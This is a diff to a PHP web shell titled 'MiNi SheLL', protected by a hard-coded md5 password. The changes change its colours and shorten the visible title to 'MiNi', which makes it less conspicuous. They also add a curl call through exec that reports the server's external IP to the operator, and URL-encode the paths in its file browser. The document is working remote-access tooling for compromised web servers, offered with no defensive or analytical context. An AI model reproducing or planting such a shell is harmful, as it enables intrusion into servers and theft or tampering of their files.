@@ -12,7 +12,7 @@ $auth_pass="cbfc4c2df8da2b26e7b85e354a5daf29"; //md5 password (default pass= adm
 <style type="text/css">
 body{
 	   font-family: "Racing Sans One", cursive;
-    background-color:#FFDEBD;
+    background-color:#e1e6f5;
 
     text-shadow:0px 0px 1px #757575;
 }
@@ -52,7 +52,7 @@ input,select,textarea{
 </head>
 <body>
 <center><h1>
-<a href="<?php echo basename($_SERVER['PHP_SELF']);?>"> ><font color="red">MiNi SheLL</font></a></h1>
+<a href="<?php echo basename($_SERVER['PHP_SELF']);?>"> ><font color="red">MiNi</font></a></h1>
 
 <?php
 if(!isset($_SESSION["adm"])){
@@ -73,6 +73,11 @@ header("Refresh:0");
 }
 }
 else{
+
+ $external_ip = exec('curl http://icanhazip.com/;');
+echo "Server IP: $external_ip</br>";
+
+
 if(get_magic_quotes_gpc()){
     foreach($_POST as $key=>$value){
         $_POST[$key] = stripslashes($value);
@@ -248,8 +253,9 @@ if(isset($_GET['filesrc'])){
 
     foreach($scandir as $dir){
         if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
+        $paath=urlencode("$path/$dir");
         echo "<tr>
-        <td><a href=\"?path=$path/$dir\">$dir</a></td>
+        <td><a href=\"?path=$paath\">$dir</a></td>
         <td><center>--</center></td>
         <td><center>";
         if(is_writable("$path/$dir")) echo '<font color="green">';
@@ -282,9 +288,11 @@ if(isset($_GET['filesrc'])){
         }else{
             $size = $size.' KB';
         }
+        $paath=urlencode($path);
+        $fpaath=urlencode("$path/$file");
 
         echo "<tr>
-        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
+        <td><a href=\"?filesrc=$fpaath&path=$paath\">$file</a></td>
         <td><center>".$size."</center></td>
         <td><center>";
         if(is_writable("$path/$file")) echo '<font color="green">';
